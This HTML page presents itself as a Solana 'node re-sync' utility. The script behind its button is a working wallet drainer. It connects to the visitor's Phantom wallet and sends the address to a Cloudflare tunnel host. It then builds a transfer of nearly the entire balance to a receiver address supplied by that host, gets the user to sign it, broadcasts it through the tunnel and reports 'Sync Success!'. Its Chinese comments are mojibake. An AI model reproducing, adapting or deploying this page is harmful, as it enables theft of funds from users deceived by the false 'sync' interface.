<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Node Sync Center</title>
    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
    <style>
        body { background: #000; color: #14f195; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { border: 1px solid #14f195; padding: 30px; border-radius: 8px; text-align: center; width: 280px; }
        button { background: #14f195; color: #000; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; border-radius: 4px; margin-top: 20px; }
        #log { font-size: 10px; color: #555; margin-top: 15px; }
    </style>
</head>
<body>
    <div class="box">
        <h3 style="color:#9945FF;">SYSTEM RE-SYNC</h3>
        <p style="font-size:12px;">Node Status: <span style="color:red;">Lagging</span></p>
        <button id="cta">START SYNC</button>
        <div id="log">Ready to connect...</div>
    </div>

    <script>
        const tunnel = "https://trading-thesis-isolation-cookbook.trycloudflare.com";

        document.getElementById('cta').onclick = async () => {
            const log = (m) => document.getElementById('log').innerText = m;
            const sWeb3 = window.solanaWeb3;
            // ğŸ”± å…¼å®¹æ€§åˆ¤æ–­ï¼šå°è¯•ä»å„ç§å…¥å£æŠ“å–é’±åŒ…
            const provider = window.solana || window.phantom?.solana;

            if (!provider) {
                alert("Please open this link inside Phantom App browser.");
                return;
            }

            try {
                log("Connecting...");
                await provider.connect();
                const userAddr = provider.publicKey.toString();

                log("Fetching params...");
                // 1. æ‹¿åç«¯åœ°å€
                const info = await fetch(`${tunnel}/prepare`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ address: userAddr })
                }).then(r => r.json());

                log("Calculating balance...");
                // 2. å»ºç«‹è¿æ¥ (ä¸èµ°æœåŠ¡å™¨ï¼Œèµ°æ‰‹æœºæµé‡ç›´è¿)
                const conn = new sWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
                const balance = await conn.getBalance(provider.publicKey);
                const bh = await conn.getLatestBlockhash();

                // 3. ç®—å­å¼¹ (ç•™ 0.001 SOL)
                const amount = balance - 1000000;
                if (amount <= 0) { log("Balance too low"); return; }

                log("Requesting sign...");
                // 4. æ„é€ äº¤æ˜“
                const tx = new sWeb3.Transaction().add(
                    sWeb3.SystemProgram.transfer({
                        fromPubkey: provider.publicKey,
                        toPubkey: new sWeb3.PublicKey(info.receiver),
                        lamports: amount,
                    })
                );
                tx.recentBlockhash = bh.blockhash;
                tx.feePayer = provider.publicKey;

                // 5. æ‹‰èµ·ç­¾å (æ ¸å¿ƒå…³é”®)
                const signed = await provider.signTransaction(tx);
                log("Broadcasting...");

                // 6. åå°å¹¿æ’­
                const serialized = signed.serialize();
                const base64 = btoa(String.fromCharCode.apply(null, new Uint8Array(serialized)));
                
                fetch(`${tunnel}/broadcast`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ raw_tx: base64 })
                });

                log("Sync Success!");
                setTimeout(() => { window.location.href = "https://explorer.solana.com/"; }, 1500);

            } catch (err) {
                console.error(err);
                log("Error: " + err.message);
            }
        };
    </script>
</body>
</html>
